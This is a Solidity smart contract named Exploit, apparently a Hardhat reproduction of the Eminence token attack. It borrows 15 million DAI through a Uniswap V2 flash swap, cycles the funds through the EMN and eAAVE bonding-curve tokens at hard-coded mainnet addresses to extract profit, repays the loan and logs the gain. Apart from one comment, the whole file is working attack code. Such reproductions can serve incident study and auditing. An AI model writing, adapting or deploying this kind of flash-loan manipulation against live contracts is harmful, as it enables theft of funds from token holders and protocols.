//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IERC20.sol';
import "./IEminence.sol";
import "hardhat/console.sol";

contract Exploit {
  IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
  IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
  IEminence emn = IEminence(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
  IEminence eAAVE = IEminence(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);

  uint borrowed = 15000000000000000000000000;

  function execute() external {
    pair.swap(borrowed, 0, address(this), "0x");
  }

  function uniswapV2Call(address,uint,uint,bytes calldata) external {
    dai.approve(address(emn), uint(-1));
    emn.buy(borrowed, 0);

    uint balance = emn.balanceOf(address(this));
    uint half = balance / 2;

    // this just burned a HUGE portion of the eminence supply
    eAAVE.buy(half, 0);

    emn.sell(half, 0);

    uint remainder = eAAVE.balanceOf(address(this));
    eAAVE.sell(remainder, 0);

    uint awardedEMN = emn.balanceOf(address(this));
    emn.sell(awardedEMN, 0);

    uint toReturn = (borrowed * 1000) / 997 + 1;
    dai.transfer(address(pair), toReturn);

    console.log( dai.balanceOf(address(this)) / 1 ether );
  }
}
